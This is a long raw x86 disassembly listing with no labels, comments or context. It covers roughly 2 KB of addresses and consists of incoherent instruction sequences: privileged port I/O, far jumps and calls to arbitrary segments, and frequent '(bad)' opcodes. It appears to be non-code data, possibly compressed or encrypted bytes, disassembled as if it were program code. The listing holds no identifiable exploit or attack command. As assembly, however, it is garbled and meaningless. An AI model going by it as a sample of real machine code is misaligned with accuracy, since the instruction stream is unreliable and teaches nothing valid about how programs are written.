  417e7b:	mov    ebp,ebp
  417e7d:	dec    ecx
  417e7e:	out    dx,al
  417e7f:	stos   DWORD PTR es:[edi],eax
  417e80:	fistp  WORD PTR [ebx+ebx*1-0x17]
  417e84:	mov    bl,0x53
  417e86:	ret    
  417e87:	xchg   ebx,eax
  417e88:	dec    ebp
  417e89:	into   
  417e8a:	sahf   
  417e8b:	cmp    al,BYTE PTR [ebp+ecx*4+0x15]
  417e8f:	mov    edx,0xcea9176e
  417e94:	int3   
  417e95:	dec    ebp
  417e96:	fndisi(8087 only) 
  417e98:	xor    ecx,ecx
  417e9a:	mov    ah,0x37
  417e9c:	add    ebp,DWORD PTR [eax]
  417e9e:	sub    DWORD PTR [esi],ebx
  417ea0:	jge    0x417e37
  417ea2:	add    edx,edi
  417ea4:	into   
  417ea5:	lds    esi,FWORD PTR [esi-0x7e83b60b]
  417eab:	cmp    ebp,DWORD PTR [ecx-0x30]
  417eae:	pusha  
  417eaf:	jmp    0x7cee:0x22a28e2a
  417eb6:	xchg   ecx,eax
  417eb7:	inc    ecx
  417eb8:	jbe    0x417e80
  417eba:	rcr    DWORD PTR [esi+ecx*4],cl
  417ebd:	pop    esp
  417ebe:	std    
  417ebf:	xchg   esp,eax
  417ec0:	les    eax,FWORD PTR [ebp-0x2d]
  417ec3:	outs   dx,DWORD PTR ds:[esi]
  417ec4:	ds dec edi
  417ec6:	or     edx,edi
  417ec8:	stc    
  417ec9:	ss xor al,0x8b
  417ecc:	sub    al,BYTE PTR cs:[edi]
  417ecf:	nop
  417ed0:	pop    ebp
  417ed1:	stos   DWORD PTR es:[edi],eax
  417ed2:	pop    esp
  417ed3:	push   ss
  417ed4:	nop
  417ed5:	dec    ch
  417ed7:	mov    esi,0xe7f230e3
  417edc:	push   ds
  417edd:	dec    eax
  417ede:	cmp    al,0x84
  417ee0:	add    eax,0xcb663df
  417ee5:	imul   DWORD PTR [esi+0x655453ee]
  417eeb:	sbb    al,0x85
  417eed:	scas   al,BYTE PTR es:[edi]
  417eee:	jp     0x417eed
  417ef0:	(bad)  
  417ef3:	and    eax,0x3a6e0d7e
  417ef8:	xor    ecx,edi
  417efa:	mov    ecx,0x73c8169
  417eff:	bound  esi,QWORD PTR [ecx+0x69]
  417f02:	mov    eax,0x69b3126f
  417f07:	sbb    ch,BYTE PTR [edi+0x35]
  417f0a:	add    BYTE PTR [esi],bh
  417f0c:	pusha  
  417f0d:	imul   eax,DWORD PTR [edx],0x37
  417f10:	sub    BYTE PTR [esp+eiz*8],0xa4
  417f14:	or     al,0xef
  417f16:	xor    eax,0xef92d61b
  417f1b:	jp     0x417f05
  417f1d:	dec    edx
  417f1e:	gs in  al,dx
  417f20:	leave  
  417f21:	mov    bl,0xe4
  417f23:	mov    ds:0x3ee4cd85,al
  417f28:	jle    0x417f11
  417f2a:	jne    0x417f18
  417f2c:	sbb    DWORD PTR [ecx-0x42],edx
  417f2f:	adc    eax,0xe6d2c261
  417f34:	not    DWORD PTR ds:0xeffa2000
  417f3a:	dec    BYTE PTR [edx+eax*2-0x71e3f43c]
  417f41:	dec    edi
  417f42:	jge    0x417f14
  417f44:	or     DWORD PTR [edx+0x26],edx
  417f47:	outs   dx,BYTE PTR es:[esi]
  417f49:	ret    0xb82f
  417f4c:	cmc    
  417f4d:	inc    ecx
  417f4e:	pop    es
  417f4f:	dec    ecx
  417f50:	xor    eax,0xf5038a0
  417f55:	push   ds
  417f56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f57:	sahf   
  417f58:	gs enter 0x3ee,0x4c
  417f5d:	je     0x417ee1
  417f5f:	push   ecx
  417f60:	push   cs
  417f61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f62:	sub    eax,0xeb8c0870
  417f67:	dec    ebp
  417f68:	iret   
  417f69:	scas   al,BYTE PTR es:[edi]
  417f6a:	xlat   BYTE PTR ds:[ebx]
  417f6b:	inc    ecx
  417f6c:	in     al,0xc9
  417f6e:	and    DWORD PTR [eax+ecx*1+0x1b196feb],eax
  417f75:	xchg   ebx,eax
  417f76:	pusha  
  417f77:	cdq    
  417f78:	daa    
  417f79:	out    dx,al
  417f7a:	das    
  417f7b:	fistp  QWORD PTR [edi+0x6f]
  417f7e:	lahf   
  417f7f:	cmp    eax,0xbac78b8d
  417f84:	xchg   BYTE PTR [eax+0x292a7caa],cl
  417f8a:	fisub  WORD PTR [edx]
  417f8c:	sahf   
  417f8d:	or     eax,0x7f4746af
  417f92:	mov    al,ds:0xe0658ffb
  417f97:	fwait
  417f98:	sub    ch,ch
  417f9a:	int    0x7b
  417f9c:	mov    al,0xf1
  417f9e:	aas    
  417f9f:	inc    eax
  417fa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fa1:	shl    dl,1
  417fa3:	stos   DWORD PTR es:[edi],eax
  417fa4:	or     eax,0x9c0811e0
  417fa9:	clc    
  417faa:	and    BYTE PTR [edi],0x25
  417fad:	aas    
  417fae:	in     eax,dx
  417faf:	jmp    0x417f32
  417fb1:	enter  0x845,0x12
  417fb5:	ins    DWORD PTR es:[edi],dx
  417fb6:	push   es
  417fb7:	mov    ds:0x4cdec6da,al
  417fbc:	xor    eax,0x2df5df03
  417fc1:	dec    edx
  417fc2:	scas   al,BYTE PTR es:[edi]
  417fc3:	adc    dl,BYTE PTR [ecx+0x6f]
  417fc6:	sbb    bl,cl
  417fc8:	or     bl,BYTE PTR [esi]
  417fca:	les    eax,FWORD PTR [ebx]
  417fcc:	push   edx
  417fcd:	pop    edx
  417fce:	xor    DWORD PTR [esi+0x4e3e2d1c],esp
  417fd4:	inc    eax
  417fd5:	push   ss
  417fd6:	mov    DWORD PTR [ebx-0x34],edx
  417fd9:	mov    al,ds:0x4c0bb246
  417fde:	pushf  
  417fdf:	pop    es
  417fe0:	sub    BYTE PTR ds:[eax-0x67300a31],bl
  417fe7:	sbb    ebx,DWORD PTR ds:0x3e71cfc7
  417fed:	retf   0xc863
  417ff0:	xchg   BYTE PTR [ebx-0x6df7066f],ah
  417ff6:	inc    esi
  417ff7:	cmp    al,dl
  417ff9:	sbb    eax,0xaea5e17e
  417ffe:	fs call 0x6649f047
  418004:	imul   esp,ebx,0x655c60d9
  41800a:	scas   al,BYTE PTR es:[edi]
  41800b:	push   ebp
  41800c:	scas   eax,DWORD PTR es:[edi]
  41800d:	jmp    0x9be11b40
  418012:	cwde   
  418013:	jle    0x418026
  418015:	push   0x8d8eb939
  41801a:	mov    ebx,0x47a3e28c
  41801f:	ds mov ah,0x79
  418022:	push   eax
  418023:	ret    
  418024:	mov    edi,0xef5b5140
  418029:	and    al,0xee
  41802b:	pushf  
  41802c:	and    eax,DWORD PTR ss:[eax-0x51fa6fcf]
  418033:	test   al,0x9d
  418035:	cmp    al,0xac
  418037:	test   al,0x1
  418039:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41803a:	int    0x4d
  41803c:	call   0x6e1353fc
  418041:	das    
  418042:	repz inc ebp
  418044:	mov    dl,0x74
  418046:	cli    
  418047:	mov    edx,0x6a9b3b85
  41804c:	pop    ss
  41804d:	imul   eax,DWORD PTR [ebx-0x9],0xffffffe5
  418051:	fsub   QWORD PTR [eax-0x7b]
  418054:	dec    eax
  418055:	retf   0xdc5c
  418058:	fist   DWORD PTR [edx-0x7bcfbaba]
  41805e:	fidivr DWORD PTR [ebx+0x4]
  418062:	xor    al,0x2d
  418064:	adc    BYTE PTR [edx+eax*1],cl
  418067:	scas   al,BYTE PTR es:[edi]
  418068:	dec    ecx
  418069:	ret    
  41806a:	aas    
  41806b:	popa   
  41806c:	lds    esp,FWORD PTR [eax]
  41806e:	retf   
  41806f:	mov    eax,edi
  418071:	push   eax
  418072:	rcr    DWORD PTR [ebx+ecx*2],cl
  418075:	mov    ah,0x20
  418077:	push   cs
  418078:	inc    ebp
  418079:	xchg   esi,eax
  41807a:	je     0x418005
  41807c:	jge    0x4180f7
  41807e:	es loopne 0x4180dc
  418081:	xchg   ebx,eax
  418082:	xchg   esp,eax
  418083:	pop    eax
  418084:	jle    0x418074
  418086:	mov    edx,0x4efd7013
  41808b:	inc    esi
  41808c:	in     eax,0x1d
  41808e:	and    esi,esp
  418090:	pop    ds
  418091:	leave  
  418092:	sbb    BYTE PTR [ebx],bl
  418094:	mov    eax,0xf120daca
  418099:	mov    ds:0x14c567ac,eax
  41809e:	test   BYTE PTR [ebp-0x80],0x8f
  4180a2:	push   edi
  4180a3:	xlat   BYTE PTR ds:[ebx]
  4180a4:	ds or  ebp,esp
  4180a7:	test   BYTE PTR [edi+0x23cc7a4a],ch
  4180ad:	xchg   edi,eax
  4180ae:	mov    edx,0x83a9f47d
  4180b3:	push   esi
  4180b4:	pop    esp
  4180b5:	push   esi
  4180b6:	dec    edi
  4180b7:	or     dl,BYTE PTR [ecx+0x54]
  4180ba:	cmp    edi,edx
  4180bc:	add    eax,0xaf75bba4
  4180c1:	(bad)  
  4180c2:	fninit 
  4180c4:	enter  0xb2bb,0x8
  4180c8:	pop    eax
  4180c9:	jnp    0x418079
  4180cb:	add    BYTE PTR [esi],0x86
  4180ce:	retf   
  4180cf:	call   0x5474da21
  4180d4:	mov    ss,WORD PTR [ebp+0x59]
  4180d7:	ins    DWORD PTR es:[edi],dx
  4180d8:	and    al,BYTE PTR [eax-0x379d2623]
  4180de:	popa   
  4180df:	pop    esp
  4180e0:	int    0x2d
  4180e2:	push   edi
  4180e3:	ret    
  4180e4:	lea    eax,[eax+edx*1-0x2d6b9aa6]
  4180eb:	fwait
  4180ec:	iret   
  4180ed:	adc    BYTE PTR ds:0xce70fad7,0x95
  4180f4:	shr    BYTE PTR [eax+0x4d],0xbd
  4180f8:	mov    ah,0xe6
  4180fa:	out    0x66,al
  4180fc:	(bad)  
  4180fd:	pop    eax
  4180fe:	jecxz  0x4180c3
  418100:	jge    0x418119
  418102:	mov    al,ds:0x3a1a7356
  418107:	inc    esp
  418108:	mul    BYTE PTR [esi]
  41810a:	cmp    DWORD PTR [edx+0x55],ecx
  41810d:	not    BYTE PTR cs:0xe9c83e1f
  418114:	xchg   esi,eax
  418115:	ror    DWORD PTR [ebp-0x52],cl
  418118:	stos   BYTE PTR es:[edi],al
  418119:	mov    DWORD PTR [edi],esi
  41811b:	int3   
  41811c:	mov    ah,0xbc
  41811e:	push   eax
  41811f:	dec    edx
  418120:	fstp   QWORD PTR [eax-0x1f]
  418123:	xchg   ecx,eax
  418124:	jmp    0x1677:0xa805e4df
  41812b:	add    esp,DWORD PTR [ecx+esi*2-0x65a2f19d]
  418132:	or     BYTE PTR [edx+eax*8+0x27],dl
  418136:	clc    
  418137:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418138:	cmc    
  418139:	lods   al,BYTE PTR ds:[esi]
  41813a:	fst    st(6)
  41813c:	dec    edi
  41813d:	popf   
  41813e:	mov    ch,0xb7
  418140:	xchg   ecx,eax
  418141:	mov    WORD PTR [edx+0x730e03bb],gs
  418147:	dec    eax
  418148:	dec    edi
  418149:	mov    eax,ds:0x79b6d239
  41814e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41814f:	pop    ebp
  418150:	mov    ds:0xb2aa8cb7,al
  418155:	jp     0x41816d
  418157:	adc    al,0x43
  418159:	pop    es
  41815a:	dec    esp
  41815b:	imul   esp,DWORD PTR [edi-0x73],0xb02402db
  418162:	iret   
  418163:	shl    esp,1
  418165:	or     edi,esp
  418167:	hlt    
  418168:	push   ebx
  418169:	lods   eax,DWORD PTR ds:[esi]
  41816a:	push   ecx
  41816b:	repnz sbb dl,dl
  41816e:	sbb    al,0x17
  418170:	mov    esi,ds
  418172:	(bad)  [edi]
  418174:	inc    ecx
  418175:	fnstcw WORD PTR [eax-0x23010af2]
  41817b:	adc    al,0x25
  41817d:	test   al,0x5c
  41817f:	mov    esp,0x861b039d
  418184:	inc    eax
  418185:	out    dx,eax
  418186:	ss ds retf 
  418189:	mov    WORD PTR [esi+0x79244ae6],?
  41818f:	dec    esi
  418190:	push   edi
  418191:	lods   al,BYTE PTR ds:[esi]
  418192:	pop    esi
  418193:	mov    cl,0x5f
  418195:	sar    BYTE PTR [ebp+0x62],0xee
  418199:	xor    ecx,DWORD PTR [ecx+0x6db39952]
  41819f:	sub    al,BYTE PTR [ebx+0x71]
  4181a2:	stos   BYTE PTR es:[edi],al
  4181a3:	sbb    esi,DWORD PTR [ebx-0x748bccc4]
  4181a9:	shl    ch,cl
  4181ab:	cmp    BYTE PTR [edi-0x7912d4e1],bh
  4181b1:	imul   esp,DWORD PTR [ebx-0x54],0xffffffa0
  4181b5:	sbb    bh,BYTE PTR [edi]
  4181b7:	arpl   WORD PTR [ebx],bp
  4181b9:	push   ss
  4181ba:	jg     0x41817c
  4181bc:	sub    ebp,DWORD PTR [ecx-0x58]
  4181bf:	adc    al,0xbf
  4181c1:	imul   esi,eax,0x6b
  4181c4:	clc    
  4181c5:	pop    esi
  4181c6:	fldln2 
  4181c8:	or     DWORD PTR [edi+ebp*4],ecx
  4181cb:	mov    edx,0x6daa1afc
  4181d0:	jl     0x418216
  4181d2:	aad    0x46
  4181d4:	es mov al,0x47
  4181d7:	inc    edi
  4181d8:	aam    0xf3
  4181da:	pop    ecx
  4181db:	sub    BYTE PTR [esi-0x7d],bh
  4181de:	sbb    edx,DWORD PTR cs:[esp+eax*8]
  4181e2:	inc    edx
  4181e3:	jmp    0xe00a:0xbcdcc9bb
  4181ea:	mov    ah,0xee
  4181ec:	jmp    0x4133:0x8ee6304d
  4181f3:	mov    al,0xc
  4181f5:	dec    esp
  4181f6:	mov    ecx,0xee5b7f8f
  4181fb:	cmp    bh,cl
  4181fd:	(bad)  
  4181fe:	iret   
  4181ff:	push   es
  418200:	and    eax,0x86a07271
  418205:	or     DWORD PTR [ebx+0x49a3acd1],ecx
  41820b:	popa   
  41820c:	std    
  41820d:	inc    esp
  41820e:	lods   al,BYTE PTR ds:[esi]
  41820f:	push   esi
  418210:	sbb    al,0x48
  418212:	inc    edi
  418213:	ror    bl,1
  418215:	addr16 mov ecx,0xd4a2dfbb
  41821b:	rcr    DWORD PTR [ebx],1
  41821d:	gs mov ah,0xd6
  418220:	ror    DWORD PTR [esi-0x6b9cd73f],1
  418226:	pop    ds
  418227:	push   ds
  418228:	cmp    eax,0xf900a6db
  41822d:	scas   eax,DWORD PTR es:[edi]
  41822e:	dec    esp
  41822f:	imul   esi,DWORD PTR [esi+0x76],0xc94a1aa7
  418236:	fwait
  418237:	retf   0xc96e
  41823a:	pop    ds
  41823b:	repz cmc 
  41823d:	mov    al,ds:0x2e14e60
  418242:	ret    0x8cbb
  418245:	mov    edx,0x351b1b52
  41824a:	test   al,0x58
  41824c:	stos   DWORD PTR es:[edi],eax
  41824d:	int    0xa9
  41824f:	pop    edi
  418250:	ja     0x418275
  418252:	stos   BYTE PTR es:[edi],al
  418253:	xchg   ecx,eax
  418254:	mov    BYTE PTR [esi],al
  418256:	sub    dh,BYTE PTR [esi-0x58]
  418259:	ret    
  41825a:	ins    DWORD PTR es:[edi],dx
  41825b:	jge    0x4182bb
  41825d:	das    
  41825e:	push   edi
  41825f:	push   ss
  418260:	cmc    
  418261:	mov    WORD PTR [esi],fs
  418263:	add    al,0xa2
  418265:	xchg   ebp,eax
  418266:	mov    esp,0x83e29347
  41826b:	mov    ebx,0xee216576
  418270:	dec    esi
  418271:	aad    0x2b
  418273:	jl     0x41824f
  418275:	shr    DWORD PTR [eax+ebp*1],cl
  418278:	lea    esi,[ebp+0x41]
  41827b:	mov    ebx,0xce3842b4
  418280:	out    dx,eax
  418281:	call   0xa034:0x70474bb
  418288:	call   0x4c49:0x40cb32c7
  41828f:	mov    fs,ebp
  418291:	sbb    dh,BYTE PTR [esi+eax*4+0x35]
  418295:	es (bad) 
  418297:	sbb    DWORD PTR [esi+0x2d],esi
  41829a:	jecxz  0x418245
  41829c:	and    BYTE PTR [ecx+0x306a301d],ch
  4182a2:	jge    0x4182ad
  4182a4:	aam    0x24
  4182a6:	inc    esp
  4182a7:	dec    ecx
  4182a8:	xchg   eax,ebp
  4182aa:	aas    
  4182ab:	pop    eax
  4182ac:	push   es
  4182ad:	out    0xaf,eax
  4182af:	mov    edi,0x52edddf9
  4182b4:	dec    esp
  4182b5:	mov    eax,0x6413c171
  4182ba:	lds    eax,FWORD PTR [eax-0x1bcba5f2]
  4182c0:	mov    bh,0xe2
  4182c2:	push   ss
  4182c3:	sub    BYTE PTR ds:[esi+eax*1+0x6bf19503],ch
  4182cb:	out    dx,eax
  4182cc:	xchg   esp,eax
  4182cd:	cmp    DWORD PTR [edx+eax*2],esp
  4182d0:	and    DWORD PTR [ebx+0x6a],edx
  4182d3:	into   
  4182d4:	jno    0x41833b
  4182d6:	jb     0x41829a
  4182d8:	mov    al,ch
  4182da:	dec    edi
  4182db:	ins    DWORD PTR es:[edi],dx
  4182dc:	push   edi
  4182dd:	push   ds
  4182de:	rcr    DWORD PTR [ecx+0x4ee0f2dc],cl
  4182e4:	xor    esi,ebx
  4182e6:	mov    eax,ds:0x7c80ea2b
  4182eb:	cld    
  4182ec:	and    esi,DWORD PTR [ecx+0x211f5926]
  4182f2:	inc    edi
  4182f3:	lods   al,BYTE PTR ds:[esi]
  4182f4:	scas   al,BYTE PTR es:[edi]
  4182f5:	jno    0x41830f
  4182f7:	dec    edx
  4182f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182f9:	push   esi
  4182fa:	xor    eax,0x9f91d5b6
  4182ff:	xchg   edx,eax
  418300:	sub    BYTE PTR [esi-0x496451a1],dh
  418306:	sub    BYTE PTR [edx-0x27828a12],al
  41830c:	pop    ecx
  41830d:	and    BYTE PTR [ebx-0x6f8d266f],ah
  418313:	xlat   BYTE PTR ds:[ebx]
  418314:	jp     0x418329
  418316:	fs add eax,0xc2af7b3d
  41831c:	scas   eax,DWORD PTR es:[edi]
  41831d:	jbe    0x41838e
  41831f:	adc    DWORD PTR [eax-0xd63033],esi
  418325:	sub    BYTE PTR [ebp-0x5a],bh
  418328:	gs addr16 lahf 
  41832b:	jle    0x418375
  41832d:	inc    ecx
  41832e:	and    al,0x77
  418330:	pop    ds
  418331:	mov    WORD PTR [edi+0x5c],cs
  418334:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418335:	lods   eax,DWORD PTR ds:[esi]
  418336:	mov    es,WORD PTR [ecx]
  418338:	shl    BYTE PTR [ebx+0x59],cl
  41833b:	imul   esp,DWORD PTR [edi],0x786bf295
  418341:	push   esp
  418342:	mov    dl,BYTE PTR [ebx+edi*1+0x18]
  418346:	pop    ss
  418347:	and    ch,BYTE PTR [bx+di-0x6de3]
  41834c:	xchg   esp,eax
  41834d:	gs ret 0x649a
  418351:	mov    ebp,esi
  418353:	jp     0x418366
  418355:	jecxz  0x4182fd
  418357:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418358:	bound  esi,QWORD PTR [ebp-0x310522d2]
  41835e:	xchg   ebp,eax
  41835f:	into   
  418360:	add    ah,bh
  418362:	je     0x418332
  418364:	xor    edi,eax
  418366:	popa   
  418367:	push   es
  418368:	(bad)  
  418369:	push   ds
  41836a:	imul   ebx,DWORD PTR [edx-0x5faef50d],0x6e
  418371:	out    dx,al
  418372:	xchg   ecx,eax
  418373:	sub    al,0x9d
  418375:	(bad)  
  418376:	pop    ecx
  418377:	bound  esp,QWORD PTR [edx]
  418379:	add    ecx,esi
  41837b:	jbe    0x418313
  41837d:	xchg   edx,eax
  41837e:	or     edi,ebx
  418380:	mov    ch,0x23
  418382:	lock cld 
  418384:	mov    DWORD PTR [edi+0x71],edx
  418387:	int3   
  418388:	jae    0x418332
  41838a:	mov    eax,0xb6ff9dd7
  41838f:	arpl   WORD PTR [ebx],cx
  418391:	sub    eax,0x506c8407
  418396:	jne    0x418333
  418398:	and    eax,0x9225b295
  41839d:	js     0x41833d
  41839f:	ret    
  4183a0:	cld    
  4183a1:	xor    al,0xfd
  4183a3:	or     BYTE PTR [edx-0x56],al
  4183a6:	sahf   
  4183a7:	leave  
  4183a8:	ins    BYTE PTR es:[edi],dx
  4183a9:	(bad)  
  4183ab:	aad    0xb4
  4183ad:	mov    cl,0x7f
  4183af:	mov    dh,0x90
  4183b1:	jnp    0x4183b6
  4183b3:	out    0x56,eax
  4183b5:	push   ebx
  4183b6:	sbb    eax,0xbcab1c7b
  4183bb:	sbb    BYTE PTR [ebx-0x72],al
  4183be:	add    ah,BYTE PTR [ebx+0x5e26fe35]
  4183c4:	lds    eax,FWORD PTR [ebp+0x1136dadd]
  4183ca:	mov    dh,0x54
  4183cc:	out    dx,eax
  4183cd:	push   edi
  4183ce:	adc    eax,0x7d6b094f
  4183d3:	pop    edx
  4183d4:	sahf   
  4183d5:	popa   
  4183d6:	les    ebp,FWORD PTR [esi+0x143b5053]
  4183dc:	sbb    al,0x65
  4183de:	lahf   
  4183df:	sub    WORD PTR [eax],0x68
  4183e3:	dec    ecx
  4183e4:	sti    
  4183e5:	mov    dh,0x36
  4183e7:	jb     0x418438
  4183e9:	mov    DWORD PTR [ecx-0x6451d311],edx
  4183ef:	lea    ebp,[edi-0x4dbcd11f]
  4183f5:	xchg   ebx,eax
  4183f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4183f7:	cmp    ebx,esi
  4183f9:	sbb    bl,BYTE PTR [ecx]
  4183fb:	retf   
  4183fc:	mov    ds:0xbab4e017,al
  418401:	mov    WORD PTR [ecx+esi*2+0x2dcad115],fs
  418408:	cli    
  418409:	sub    edx,0x60a04073
  41840f:	cmp    BYTE PTR [eax-0x54],0x59
  418413:	sbb    eax,0xc8ad151
  418418:	imul   esp,DWORD PTR [edx+0x693e32a7],0xd28854fb
  418422:	inc    edx
  418423:	push   eax
  418424:	xor    ah,BYTE PTR [edx-0xa2bc742]
  41842a:	or     DWORD PTR [ebp-0x38],0x4f
  41842e:	mov    ebx,0x92eaab72
  418433:	xchg   DWORD PTR [ebp+0x56],esi
  418436:	jle    0x418479
  418438:	(bad)  
  418439:	dec    esp
  41843a:	popa   
  41843b:	xchg   ebp,eax
  41843c:	sbb    al,ah
  41843e:	pop    ds
  41843f:	ds stos BYTE PTR es:[edi],al
  418441:	jl     0x418438
  418443:	jecxz  0x4184ac
  418445:	xor    eax,0xeaa68593
  41844a:	popa   
  41844b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41844c:	(bad)  
  41844d:	adc    esi,DWORD PTR [esi-0x696bffef]
  418453:	xor    ebp,esp
  418455:	adc    eax,0x89500416
  41845a:	lock stc 
  41845c:	lahf   
  41845d:	xor    eax,0x65839ec1
  418462:	inc    eax
  418463:	sbb    al,0x64
  418465:	lahf   
  418466:	dec    ebp
  418467:	jne    0x41847c
  418469:	cmp    ecx,esi
  41846b:	jno    0x418493
  41846d:	ins    BYTE PTR es:[edi],dx
  41846e:	mov    edi,?
  418470:	addr16 jb 0x418434
  418473:	repz sub eax,0x811a01eb
  418479:	adc    DWORD PTR [edi],ebp
  41847b:	jbe    0x41845d
  41847d:	sbb    BYTE PTR ds:0xd788c6c2,bl
  418483:	dec    edi
  418484:	sub    al,0xc
  418486:	icebp  
  418487:	dec    ebx
  418488:	xchg   DWORD PTR [eax],ecx
  41848a:	fcmovb st,st(7)
  41848c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41848d:	sub    BYTE PTR [ecx+0x1b],al
  418490:	les    edi,FWORD PTR [esi]
  418492:	mov    dl,0xf1
  418494:	mov    eax,0xac73efca
  418499:	mov    DWORD PTR [edi+ebx*8],0xc6b9e6b0
  4184a0:	in     eax,dx
  4184a1:	xor    eax,0x51298fdd
  4184a6:	jl     0x418470
  4184a8:	pushf  
  4184a9:	sbb    eax,ecx
  4184ab:	xor    eax,0x2f6aaee6
  4184b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184b1:	xchg   ebx,eax
  4184b2:	adc    BYTE PTR [eax+0x2b1149fa],bh
  4184b8:	inc    ebx
  4184b9:	imul   ecx,DWORD PTR [ebp+0x534b666f],0xffffffd2
  4184c0:	and    bl,BYTE PTR [ebx+0xdb871ed]
  4184c6:	(bad)  
  4184c8:	add    BYTE PTR [ebx],ch
  4184ca:	or     ebp,esi
  4184cc:	enter  0xc5f5,0xdd
  4184d0:	and    BYTE PTR [ebx-0x9],ah
  4184d3:	mov    ebx,0xa4de0f23
  4184d8:	push   es
  4184d9:	sub    ebx,DWORD PTR [edi+0xc]
  4184dc:	mov    DWORD PTR [edx+0x61d04430],0x78acd80f
  4184e6:	dec    eax
  4184e7:	rcl    BYTE PTR [edx+0x9c6a377],cl
  4184ed:	sub    al,0x9b
  4184ef:	ds aaa 
  4184f1:	cmp    esi,ebp
  4184f3:	loop   0x4184d9
  4184f5:	pop    ss
  4184f6:	lods   eax,DWORD PTR ds:[esi]
  4184f7:	sub    esp,ebp
  4184f9:	or     esp,DWORD PTR [esi-0x4c719dd8]
  4184ff:	cmp    BYTE PTR [edi-0x6603f089],bl
  418505:	pop    es
  418506:	daa    
  418507:	pop    ds
  418508:	xchg   edx,eax
  418509:	call   0x88a1:0x51019497
  418510:	jp     0x4184b1
  418512:	(bad)
  418517:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418518:	dec    ebx
  418519:	(bad)  
  41851a:	and    ecx,ecx
  41851c:	mov    BYTE PTR [edi-0x59],bh
  41851f:	xchg   ebx,eax
  418520:	inc    eax
  418521:	and    ebx,DWORD PTR [edi+0x4b]
  418524:	lea    esi,[ebx-0x7a]
  418527:	ins    DWORD PTR es:[edi],dx
  418528:	mov    bh,al
  41852a:	mov    ebp,0xfe4a43b0
  41852f:	cwde   
  418530:	icebp  
  418531:	jne    0x4184bd
  418533:	sub    ebx,DWORD PTR [eax]
  418535:	sub    BYTE PTR [ebx],dh
  418537:	popf   
  418538:	push   ss
  418539:	inc    ebp
  41853a:	sbb    BYTE PTR [eax-0x2aff6bf8],al
  418540:	dec    ebp
  418541:	(bad)  
  418542:	gs cmp al,0xcb
  418545:	out    dx,al
  418546:	fwait
  418547:	(bad)
  41854a:	push   ebp
  41854b:	jle    0x41859c
  41854d:	xor    BYTE PTR ds:0x295034b1,ah
  418553:	ss je  0x418578
  418556:	lods   eax,DWORD PTR ds:[esi]
  418557:	xor    DWORD PTR [ebx-0x3a],0xcecbbe27
  41855e:	(bad)  
  41855f:	xchg   esi,eax
  418560:	dec    ebp
  418561:	xchg   esp,eax
  418562:	stos   BYTE PTR es:[edi],al
  418563:	sub    DWORD PTR [edi-0x52],edi
  418566:	xor    DWORD PTR [ebx+0x55],eax
  418569:	sub    esp,ebp
  41856b:	mov    bh,0x98
  41856d:	cmovo  eax,edi
  418570:	int    0x72
  418572:	or     eax,0x64707445
  418577:	mov    esp,0x65ad8b13
  41857c:	dec    BYTE PTR [ebx]
  41857e:	sub    al,0x1e
  418580:	idiv   BYTE PTR [ecx-0x6fd14894]
  418586:	push   edi
  418587:	add    ebp,DWORD PTR [ecx]
  418589:	jecxz  0x418574
  41858b:	jb     0x4185e1
  41858d:	lea    esi,[ebp-0x11930e3]
  418593:	xor    cl,BYTE PTR [ebp+0x78b5e1c]
  418599:	push   edi
  41859a:	mov    ebx,0xee648227
  41859f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185a0:	loope  0x41861f
  4185a2:	add    ah,BYTE PTR [ecx]
  4185a4:	ds jns 0x418569
  4185a7:	call   0x93df:0x97f2620
  4185ae:	jbe    0x4185e2
  4185b0:	cmp    al,0x1c
  4185b2:	mov    al,ah
  4185b4:	xor    eax,0x6bd8fae
  4185b9:	ja     0x418618
  4185bb:	stc    
  4185bc:	aam    0x83
  4185be:	jbe    0x4185bd
  4185c0:	rol    BYTE PTR [ebp-0x117b7785],cl
  4185c6:	adc    BYTE PTR [ecx-0x1192a095],bh
  4185cc:	fwait
  4185cd:	int    0xf0
  4185cf:	cmp    DWORD PTR [ebp+0x3c747881],ebx
  4185d5:	mov    ecx,fs
  4185d7:	push   ds
  4185d8:	push   es
  4185d9:	add    al,0x3b
  4185db:	xchg   esi,eax
  4185dc:	pop    ebx
  4185dd:	xchg   ebp,eax
  4185de:	xor    al,0x16
  4185e0:	outs   dx,BYTE PTR ds:[esi]
  4185e1:	jbe    0x4185d4
  4185e3:	call   0x2b22:0x666dd56b
  4185ea:	sbb    BYTE PTR [esi],ch
  4185ec:	neg    DWORD PTR fs:[esi]
  4185ef:	outs   dx,BYTE PTR ds:[esi]
  4185f0:	adc    al,BYTE PTR [ebx-0x47c179b4]
  4185f6:	and    eax,0x9b413cd5
  4185fb:	xchg   edx,eax
  4185fc:	and    dl,BYTE PTR [eax-0xe]
  4185ff:	shl    BYTE PTR [eax+0x57],0x19
  418603:	je     0x418592
  418605:	add    DWORD PTR [eax-0x2f],ebp
  418608:	out    0xbe,al
  41860a:	xor    al,0x7f
  41860c:	popf   
  41860d:	push   ebp
  41860e:	pop    eax
  41860f:	dec    ebp
  418610:	inc    esi
  418611:	ja     0x418593
  418613:	fs jbe 0x4185d8
  418616:	pop    ss
  418617:	in     eax,dx
  418618:	jnp    0x418615
  41861a:	adc    eax,0x9f2e57e0
  41861f:	icebp  
  418620:	jno    0x4185c0
  418622:	nop
  418623:	xor    ebp,0x7c3f50e0
  418629:	stos   DWORD PTR es:[edi],eax
  41862a:	sub    eax,0x57a3b0a5
  41862f:	xor    cl,0x1e
  418632:	xor    bh,ah
  418634:	and    ch,BYTE PTR [eax]
  418636:	xchg   edx,eax
  418637:	cmp    DWORD PTR [esi],0x3b
  41863a:	cld    
  41863b:	xchg   esp,eax
  41863c:	jo     0x418671
  41863e:	pop    esp
